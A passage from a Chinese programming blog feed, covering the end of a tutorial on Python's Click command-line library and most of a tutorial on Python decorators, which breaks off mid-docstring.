<h4 id="多值参数"><a href="#多值参数" class="headerlink" title="多值参数"></a>多值参数</h4><p>有时，一个参数需要接收多个值, 比如我们算一个立方体的体积, 这时候我们就需求通过nargs指定 该参数接收多少个值, 比如<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@cube.command()</span></div><div class="line"><span class="meta">@click.option('-p', '--profile', type=int, nargs=3 ,help="The cube Length, width and height")</span></div><div class="line"><span class="meta">@click.help_option('-h', '--help')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">volume</span><span class="params">(profile)</span>:</span></div><div class="line">    <span class="string">"""Compute cube's volume"""</span></div><div class="line">    <span class="keyword">if</span> profile <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">raise</span> click.BadOptionUsage(<span class="string">"miss profile!"</span>)</div><div class="line">    v = profile[<span class="number">0</span>] * profile[<span class="number">1</span>] * profile[<span class="number">2</span>]</div><div class="line">    click.echo(<span class="string">"the cube's volume is %s"</span> % v)</div></pre></td></tr></table></figure></p>
<h4 id="密码参数"><a href="#密码参数" class="headerlink" title="密码参数"></a>密码参数</h4><p>命令行我们常常有输入密码的需求，这个我们应该怎么用喃？<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@user.command()</span></div><div class="line"><span class="meta">@click.option('-p', '--password', prompt=True, hide_input=True, confirmation_prompt=True)</span></div><div class="line"><span class="meta">@click.help_option('-h', '--help')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(password)</span>:</span></div><div class="line">    <span class="string">"""Create a user"""</span></div><div class="line">    click.echo(<span class="string">'Encrypting password to %s'</span> % password)</div></pre></td></tr></table></figure></p>
<p>这个看下效果:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">➜  test python3 test.py user create</div><div class="line">Password:</div><div class="line">Repeat <span class="keyword">for</span> confirmation:</div><div class="line">Encrypting password to <span class="number">123</span></div></pre></td></tr></table></figure></p>
<h3 id="必选参数"><a href="#必选参数" class="headerlink" title="必选参数"></a>必选参数</h3><p>相较于可选参数的灵活性而言, 必须参数比较简单了。用@click.argument来添加固定参数。</p>
<h4 id="定参"><a href="#定参" class="headerlink" title="定参"></a>定参</h4><p>这里需要主要位置参数的顺序了。比如3个定参数 x y z<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@user.command()</span></div><div class="line"><span class="meta">@click.argument('x')</span></div><div class="line"><span class="meta">@click.argument('y')</span></div><div class="line"><span class="meta">@click.argument('z')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(x, y, z)</span>:</span></div><div class="line">    <span class="string">"""Create a user"""</span></div><div class="line">    click.echo(<span class="string">"%s, %s, %s"</span> % (x, y, z))</div></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">➜  test python3 test.py user create <span class="number">1</span></div><div class="line">Usage: test.py user create [OPTIONS] X Y Z</div><div class="line"></div><div class="line">Error: Missing argument <span class="string">"y"</span>.</div><div class="line">➜  test python3 test.py user create <span class="number">1</span> <span class="number">2</span></div><div class="line">Usage: test.py user create [OPTIONS] X Y Z</div><div class="line"></div><div class="line">Error: Missing argument <span class="string">"z"</span>.</div><div class="line">➜  test python3 test.py user create <span class="number">1</span> <span class="number">2</span> <span class="number">3</span></div><div class="line"><span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span></div></pre></td></tr></table></figure>
<h4 id="不定参"><a href="#不定参" class="headerlink" title="不定参"></a>不定参</h4><p>参数不定的情况也是常有的, 比如我们想将多个文件移到一个文件里面, src: file1 file2 file3 dir: file4。我们让nargs=-1就可以了, 他表示接收[:-1]的参数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@user.command()</span></div><div class="line"><span class="meta">@click.argument('src', nargs=-1)</span></div><div class="line"><span class="meta">@click.argument('dst', nargs=1)</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(src, dst)</span>:</span></div><div class="line">    <span class="string">"""Create a user"""</span></div><div class="line">    click.echo(<span class="string">"src: %s"</span> % <span class="string">' '</span>.join(list(src)))</div><div class="line">    click.echo(<span class="string">"dst: %s"</span> % dst)</div></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜  test python3 test.py user create file1 file2 file3 file4</div><div class="line">src: file1 file2 file3</div><div class="line">dst: file4</div></pre></td></tr></table></figure>
<h2 id="其他功能"><a href="#其他功能" class="headerlink" title="其他功能"></a>其他功能</h2><p>click还有比较多的高级功能，比如分页和彩色打印, click文档写得比较好: <a href="http://click.pocoo.org/6/" target="_blank" rel="external">click官方文档</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>pocoo非常热衷于使用装饰器, 可以说他们对装饰器的使用简直出神入化, 在flask里面就可见一斑, 而前一篇才讲了装饰器, 这个click库里面对装饰器的使用也称得上典范, 源码很值得一读。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前写过一篇博客介绍过如何写漂亮的命令行工具, 不过使用的是golang的cobra库, 整体而言效果和使用体验还是非常不错的, 不过今天看博客时发现了一个更不错的库，而且是Python的: Click,所以用起来应该更得心应手。 之前在开发openstack客户端时, 模仿openstack sdk写过CLI, 他也是对argparse库上做的封装, 但是使用起来也比较复杂, 简单看了下click的文档, 体验还是非常不错的。&lt;br&gt;
    
    </summary>
    
      <category term="开发语言" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/"/>
    
      <category term="Python" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/Python/"/>
    
    
      <category term="click" scheme="https://blog.yumaojun.net/tags/click/"/>
    
  </entry>
  
  <entry>
    <title>Python进阶系列-装饰器</title>
    <link href="https://blog.yumaojun.net/2017/02/05/python-deractor/"/>
    <id>https://blog.yumaojun.net/2017/02/05/python-deractor/</id>
    <published>2017-02-05T06:59:14.000Z</published>
    <updated>2017-02-07T16:07:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>装饰器是一个非常重要的概念，可能算是进阶的一大门槛。装饰器允许向一个现有的对象添加新的功能，同时又不改变其结构,是一种功能增强的模式。在面向对象(OOP)的设计模式中，decorator被称为装饰模式。OOP的装饰模式需要通过继承和组合来实现，而Python除了能支持OOP的decorator外，直接从语法层次支持decorator。Python的decorator可以用函数实现，也可以用类实现。接下来将全面介绍关于Python装饰器相关的知识。<br><a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>装饰器本质上是一个Python函数，它可以让其他函数在不需要做任何代码变动的前提下增加额外功能，装饰器的返回值也是一个函数对象。它经常用于有切面需求的场景，比如：插入日志、性能测试、事务处理、缓存、权限校验等场景。装饰器是解决这类问题的绝佳设计，有了装饰器，我们就可以抽离出大量与函数功能本身无关的雷同代码并继续重用。<br>概括的讲，装饰器的作用就是为已经存在的函数或对象添加额外的功能。</p>
<h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>在Python里，一切皆对象, 函数更是头等对象，函数对象可以被赋值给变量，所以，通过变量也能调用该函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">now</span><span class="params">()</span>:</span></div><div class="line"><span class="meta">... </span>    print(<span class="string">'2017-02-02'</span>)</div><div class="line">...</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>f = now</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>f()</div><div class="line"><span class="number">2017</span><span class="number">-02</span><span class="number">-02</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>f.__name__</div><div class="line"><span class="string">'now'</span></div></pre></td></tr></table></figure></p>
<p>现在，假设我们要增强now()函数的功能，比如，在函数调用前后自动打印日志，但又不希望修改now()函数的定义,该怎么做喃？<br>最简单的方式就是动态替换now，并保持函数签名不变<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">now</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'2017-02-02'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(func)</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">()</span>:</span></div><div class="line">        print(<span class="string">"[DEBUG]: enter &#123;&#125;()"</span>.format(func.__name__))</div><div class="line">        <span class="keyword">return</span> func()</div><div class="line"></div><div class="line">    wrapper.__name__ = func.__name__</div><div class="line">    <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line">now = debug(now)</div><div class="line"></div><div class="line">now()</div></pre></td></tr></table></figure></p>
<p>为了方便python在语法层面就已经支持了装饰器(python &gt; 2.4),@语法糖实际上就等于<code>now = debug(now)</code>, 因此实际上应该这样写<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(func)</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">()</span>:</span></div><div class="line">        print(<span class="string">"[DEBUG]: enter &#123;&#125;()"</span>.format(func.__name__))</div><div class="line">        <span class="keyword">return</span> func()</div><div class="line"></div><div class="line">    wrapper.__name__ = func.__name__</div><div class="line">    <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="meta">@debug</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">now</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'2017-02-02'</span>)</div><div class="line"></div><div class="line">now()</div></pre></td></tr></table></figure></p>
<p>这个dubug装饰器有个巨大的缺陷: 我们只能装饰不带参数的函数。实际上函数的形式各种各样，如何才能一个装饰器适配各种函数喃？python提供的可变参数可以很好的解决这个问题。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(func)</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></div><div class="line">        print(<span class="string">"[DEBUG]: enter &#123;&#125;()"</span>.format(func.__name__))</div><div class="line">        <span class="keyword">return</span> func(*args, **kwargs)</div><div class="line"></div><div class="line">    wrapper.__name__ = func.__name__</div><div class="line">    <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="meta">@debug</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">now</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'2017-02-02'</span>)</div><div class="line"></div><div class="line"><span class="meta">@debug</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(name)</span>:</span></div><div class="line">    print(<span class="string">"hello %s"</span> % name)</div><div class="line"></div><div class="line">now()</div><div class="line">hello(<span class="string">"Bob"</span>)</div></pre></td></tr></table></figure></p>
<p>如此一个基础的装饰器就写完了，以下将介绍各式各样的装饰器。</p>
<h2 id="函数式装饰器"><a href="#函数式装饰器" class="headerlink" title="函数式装饰器"></a>函数式装饰器</h2><p><em>装饰器本身是一个函数</em></p>
<h3 id="装饰函数"><a href="#装饰函数" class="headerlink" title="装饰函数"></a>装饰函数</h3><p><em>被装饰的对象是一个函数, wrapper是对函数的增强</em></p>
<h4 id="基础-装饰器无参数"><a href="#基础-装饰器无参数" class="headerlink" title="基础-装饰器无参数"></a>基础-装饰器无参数</h4><p>这是最基础的一种装饰器, 在引子中已经有栗子了。</p>
<h4 id="高级-装饰器有参数"><a href="#高级-装饰器有参数" class="headerlink" title="高级-装饰器有参数"></a>高级-装饰器有参数</h4><p>带参数的装饰器和类装饰器属于进阶的内容。在理解这些装饰器之前，最好对函数的闭包和装饰器的接口约定有一定了解。关于python中的闭包概念我在下一篇中会单独介绍,这里你只需要知道闭包是一个携带状态的函数即可。<br>实际上就是返回装饰器的一个函数，但是这个装饰器携带外部变量(这就是闭包)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(level=<span class="string">'INFO'</span>)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(func)</span>:</span></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></div><div class="line">            print(<span class="string">"[&#123;&#125;]: enter &#123;&#125;()"</span>.format(level, func.__name__))</div><div class="line">            <span class="keyword">return</span> func(*args, **kwargs)</div><div class="line">        wrapper.__name__ = func.__name__</div><div class="line">        <span class="keyword">return</span> wrapper</div><div class="line">    <span class="keyword">return</span> decorator</div><div class="line"></div><div class="line"><span class="meta">@debug()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">now</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'2017-02-02'</span>)</div><div class="line"></div><div class="line"><span class="meta">@debug("DEBUG")</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(name)</span>:</span></div><div class="line">    print(<span class="string">"hello %s"</span> % name)</div><div class="line"></div><div class="line">now()</div><div class="line">hello(<span class="string">"Bob"</span>)</div></pre></td></tr></table></figure></p>
<h3 id="装饰类"><a href="#装饰类" class="headerlink" title="装饰类"></a>装饰类</h3><p><strong>被装饰的对象是一个类,wrapper是对类的增强,所以装饰器的变化并不大,甚至可以沿用</strong></p>
<h4 id="基础-装饰器无参数-1"><a href="#基础-装饰器无参数-1" class="headerlink" title="基础-装饰器无参数"></a>基础-装饰器无参数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cls)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></div><div class="line">        print(<span class="string">"[DEBUG]: enter &#123;&#125; class"</span>.format(cls.__name__))</div><div class="line">        <span class="keyword">return</span> cls(*args, **kwargs)</div><div class="line">    wrapper.__name__ = cls.__name_</div><div class="line">    <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="meta">@debug</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, value)</span>:</span></div><div class="line">        self.value = value</div><div class="line"></div><div class="line"><span class="meta">@debug</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(name)</span>:</span></div><div class="line">    print(<span class="string">"hello %s"</span> % name)</div><div class="line"></div><div class="line">h = Hello(<span class="string">"Bob"</span>)</div><div class="line">hello(<span class="string">"Bob"</span>)</div></pre></td></tr></table></figure>
<h4 id="高级-装饰器有参数-1"><a href="#高级-装饰器有参数-1" class="headerlink" title="高级-装饰器有参数"></a>高级-装饰器有参数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(level=<span class="string">'INFO'</span>)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(cls)</span>:</span></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></div><div class="line">            print(<span class="string">"[&#123;&#125;]: enter &#123;&#125; class"</span>.format(level, cls.__name__))</div><div class="line">            <span class="keyword">return</span> cls(*args, **kwargs)</div><div class="line"></div><div class="line">        wrapper.__name__ = cls.__name__</div><div class="line">        <span class="keyword">return</span> wrapper</div><div class="line">    <span class="keyword">return</span> decorator</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@debug()</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, value)</span>:</span></div><div class="line">        self.value = value</div><div class="line"></div><div class="line"><span class="meta">@debug("ERROR")</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(name)</span>:</span></div><div class="line">    print(<span class="string">"hello %s"</span> % name)</div><div class="line"></div><div class="line">h = Hello(<span class="string">"Bob"</span>)</div><div class="line">hello(<span class="string">"Bob"</span>)</div></pre></td></tr></table></figure>
<h2 id="类式装饰器"><a href="#类式装饰器" class="headerlink" title="类式装饰器"></a>类式装饰器</h2><p>装饰器函数其实是这样一个接口约束，它必须接受一个<code>callable</code>对象作为参数，然后返回一个<code>callable</code>对象。在Python中一般<code>callable</code>对象都是函数，但也有例外。只要某个对象重载了 <strong>call</strong> () 方法，那么这个对象就是<code>callable</code>的。<br>我们可以让类的构造函数 <strong>init</strong> () 接受一个函数，然后重载 <strong>call</strong> () 并返回一个函数，也可以达到装饰器函数的效果。</p>
<h3 id="装饰函数和类"><a href="#装饰函数和类" class="headerlink" title="装饰函数和类"></a>装饰函数和类</h3><p><em>被装饰的对象是一个函数或是一个类，其实并没有本质上的差别，因此这里合并给出栗子</em></p>
<h4 id="装饰器无参数"><a href="#装饰器无参数" class="headerlink" title="装饰器无参数"></a>装饰器无参数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">debug</span><span class="params">(object)</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, func)</span>:</span></div><div class="line">        self.func = func</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, *args, **kwargs)</span>:</span></div><div class="line">        print(<span class="string">"[DEBUG]: enter function &#123;func&#125;()"</span>.format(func=self.func.__name__))</div><div class="line">        <span class="keyword">return</span> self.func(*args, **kwargs)</div><div class="line"></div><div class="line"><span class="meta">@debug</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, value)</span>:</span></div><div class="line">        self.value = value</div><div class="line"></div><div class="line"><span class="meta">@debug</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(name)</span>:</span></div><div class="line">    print(<span class="string">"hello %s"</span> % name)</div><div class="line"></div><div class="line">h = Hello(<span class="string">"Bob"</span>)</div><div class="line">hello(<span class="string">"Bob"</span>)</div></pre></td></tr></table></figure>
<h4 id="装饰器有参数"><a href="#装饰器有参数" class="headerlink" title="装饰器有参数"></a>装饰器有参数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">debug</span><span class="params">(object)</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, level=<span class="string">'INFO'</span>)</span>:</span></div><div class="line">        self._level = level</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, func)</span>:</span></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></div><div class="line">            print(<span class="string">"[&#123;&#125;]: enter function &#123;&#125;()"</span>.format(self._level ,func.__name__))</div><div class="line">            <span class="keyword">return</span> func(*args, **kwargs)</div><div class="line">        <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="meta">@debug()</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span><span class="params">(object)</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></div><div class="line">        self.name = name</div><div class="line"></div><div class="line"><span class="meta">@debug("ERROR")</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(name)</span>:</span></div><div class="line">    print(<span class="string">"hello %s"</span> % name)</div><div class="line"></div><div class="line">h = Hello(<span class="string">"Bob"</span>)</div><div class="line">hello(<span class="string">"Bob"</span>)</div></pre></td></tr></table></figure>
<h2 id="内置装饰器"><a href="#内置装饰器" class="headerlink" title="内置装饰器"></a>内置装饰器</h2><p>内置的装饰器和普通的装饰器原理是一样的，只不过返回的不是函数，而是类对象，所以更难理解一些</p>
<h3 id="propert"><a href="#propert" class="headerlink" title="propert"></a>propert</h3><p>我们先看看property到底是啥,以下是property类的<code>doc string</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">property</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line">    property(fget=None, fset=None, fdel=None, doc=None) -&gt; property attribute</div><div class="line">    </div><div class="line">    fget is a function to be used for getting an attribute value, and likewise</div><div class="line">    fset is a function for setting, and fdel a function for del'ing, an</div><div class="line">    attribute.  Typical use is to define a managed attribute x:</div><div class="line">    </div><div class="line">    class C(object):</div><div class="line">        def getx(self): return self._x</div><div class="line">        def setx(self, value): self._x = value</div><div class="line">        def delx(self): del self._x</div><div class="line">        x = property(getx, setx, delx, "I'm the 'x' property.")</div><div class="line">    </div><div class="line">    Decorators make defining new properties or modifying existing ones easy:</div><div class="line">    </div><div class="line">    class C(object):</div><div class="line">        @property</div><div class="line">        def x(self):</div><div class="line">            "I am the 'x' property."</div><div class="line">            return self._x</div><div class="line">        @x.setter</div><div class="line">        def x(self, value):</div><div class="line">            self._x = value</div><div class="line">        @x.deleter</div><div class="line">        def x(self):</div><div class="line">            del self._x</div><div class="line">    """</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, fget=None, fset=None, fdel=None, doc=None)</span>:</span> <span class="comment"># known special case of property.__init__</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line"></div><div class="line">    ...</div></pre></td></tr></table></figure></p>
<p>实际上property装饰器帮我们完成了<code>x = property(getx, setx, delx, &quot;I&#39;m the &#39;x&#39; property.&quot;)</code>这个动作，而且返回的是一个property对象。</p>
<h3 id="staticmethod"><a href="#staticmethod" class="headerlink" title="staticmethod"></a>staticmethod</h3><p>staticmethod传入一个函数返回一个staticmethod的对象。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">staticmethod</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line">    staticmethod(function) -&gt; method</div><div class="line">    </div><div class="line">    Convert a function to be a static method.</div><div class="line">    </div><div class="line">    A static method does not receive an implicit first argument.</div><div class="line">    To declare a static method, use this idiom:</div><div class="line">    </div><div class="line">         class C:</div><div class="line">              def f(arg1, arg2, ...): ...</div><div class="line">              f = staticmethod(f)</div><div class="line">    </div><div class="line">    It can be called either on the class (e.g. C.f()) or on an instance</div><div class="line">    (e.g. C().f()).  The instance is ignored except for its class.</div><div class="line">    </div><div class="line">    Static methods in Python are similar to those found in Java or C++.</div><div class="line">    For a more advanced concept, see the classmethod builtin.</div><div class="line">    """</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, function)</span>:</span> <span class="comment"># real signature unknown; restored from __doc__</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line"></div><div class="line">    ...</div></pre></td></tr></table></figure></p>
<h3 id="classmethod"><a href="#classmethod" class="headerlink" title="classmethod"></a>classmethod</h3><p>同理classmethod传入一个函数返回一个classmethod对象。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">classmethod</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line">    classmethod(function) -&gt; method</div><div class="line">    </div><div class="line">    Convert a function to be a class method.</div><div 